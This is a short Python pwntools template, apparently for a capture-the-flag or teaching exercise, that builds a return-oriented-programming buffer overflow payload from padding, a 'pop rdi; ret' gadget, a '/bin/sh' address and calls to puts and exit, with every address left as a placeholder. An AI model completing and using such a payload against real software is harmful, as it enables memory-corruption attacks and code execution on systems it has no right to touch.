from pwn import *
padding = cyclic(?) 		# AMOUNT OF PADDING


gadget	 = p64(?) 	# ADDRESS OF pop rdi; ret
argument = p64(?) 	# ADDRESS OF /bin/sh
function = p64(?) 	# ADDRESS OF puts
function2= p64(?) 	# ADDRESS OF exit()

f =open('input.txt', 'w')	# SIMULATES USER INPUT
f.write("1\n")
f.close()

f =open('input.txt', 'ab')	# CRAFTING ACTUAL INPUT BUFFER
f.write(padding)		# PADDING FIRST
f.write(gadget)			# OVERWRITE THE RETURN ADDRESS WITH THE ADDRESS OF THE FIRST GADGET
f.write(argument)		# THE ARGUMENT TO BE POPPED OFF BY THE GADGET
f.write(function)		# THE ADDRESS OF THE FUNCTION TO BE CALLED (BY THE RET AT THE END OF THE GADGET)
f.write(function2)		# THE ADDRESS OF THE FUNCTION TO BE CALLED NEXT (BY THE RET AT THE END OF THE FIRST FUNCTION) 
				# - THIS CAN BE A FUNCTION (E.G. EXIT) OR ANOTHER GADGET (IF NEEDED TO SET UP THE NEXT FUNCTION)

f.close()			# FIN



